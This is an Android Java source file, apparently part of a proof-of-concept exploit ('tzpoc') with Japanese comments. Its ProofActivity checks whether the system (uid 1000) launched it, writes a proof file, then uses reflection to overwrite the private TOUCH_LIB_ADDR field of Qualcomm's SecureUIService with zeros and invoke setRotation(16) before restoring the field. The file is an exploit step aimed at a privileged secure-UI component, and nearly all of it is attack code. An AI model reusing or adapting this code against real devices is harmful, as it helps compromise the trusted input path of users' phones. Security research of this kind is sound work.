package com.example.tzpoc;

import android.app.Activity;
import android.os.Binder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Process;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

public class ProofActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        int callerUid = Binder.getCallingUid();  // 呼び出し元のUID
        int myUid = Process.myUid();

        String msg = "[+] ProofActivity: myUid=" + myUid + ", callerUid=" + callerUid;
        Log.i("ProofActivity", msg);
        MainActivity.appendLog(msg);

        if (callerUid == 1000) {
            MainActivity.appendLog("[!!!] SUCCESS: Called from system (uid=1000)");
            // 証跡ファイルを作成（システムが呼び出したことを証明）
            try {
                File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
                if (!dir.exists()) dir.mkdirs();
                File proof = new File(dir, "caller_is_system.txt");
                try (PrintWriter pw = new PrintWriter(new FileOutputStream(proof))) {
                    pw.println("Caller UID: " + callerUid);
                    pw.println("My UID: " + myUid);
                    pw.println("Timestamp: " + new java.util.Date());
                }
                MainActivity.appendLog("[+] Proof file created: " + proof.getAbsolutePath());
            } catch (Exception e) {
                MainActivity.appendLog("[-] Failed to create proof: " + e.getMessage());
            }

            // システム権限でSecureUIリフレクションを試行（これも呼び出し元がシステムなので実行可能）
            attemptSecureUIReflection();
        } else {
            MainActivity.appendLog("[!] Caller UID is " + callerUid + ", not system.");
        }

        finish();
    }

    private void attemptSecureUIReflection() {
        MainActivity.appendLog("[*] Attempting SecureUI reflection (caller is system)...");
        try {
            Class<?> clazz = Class.forName("com.qualcomm.qti.services.secureui.SecureUIService");
            java.lang.reflect.Field contextField = clazz.getDeclaredField("context");
            contextField.setAccessible(true);
            Object context = contextField.get(null);
            MainActivity.appendLog("[+] SecureUIService.context = " + context);

            java.lang.reflect.Field touchField = clazz.getDeclaredField("TOUCH_LIB_ADDR");
            touchField.setAccessible(true);
            byte[] orig = (byte[]) touchField.get(null);
            MainActivity.appendLog("[+] Original TOUCH_LIB_ADDR: " + bytesToHex(orig));

            byte[] newAddr = {0x00,0x00,0x00,0x00,0x00,0x00};
            touchField.set(null, newAddr);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR modified to zeros");

            java.lang.reflect.Method setRotation = clazz.getMethod("setRotation", int.class);
            setRotation.invoke(null, 16);
            MainActivity.appendLog("[+] setRotation(16) called.");

            touchField.set(null, orig);
            MainActivity.appendLog("[+] TOUCH_LIB_ADDR restored.");
        } catch (Exception e) {
            MainActivity.appendLog("[-] SecureUI reflection failed: " + e.getMessage());
        }
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02X ", b));
        return sb.toString();
    }
}
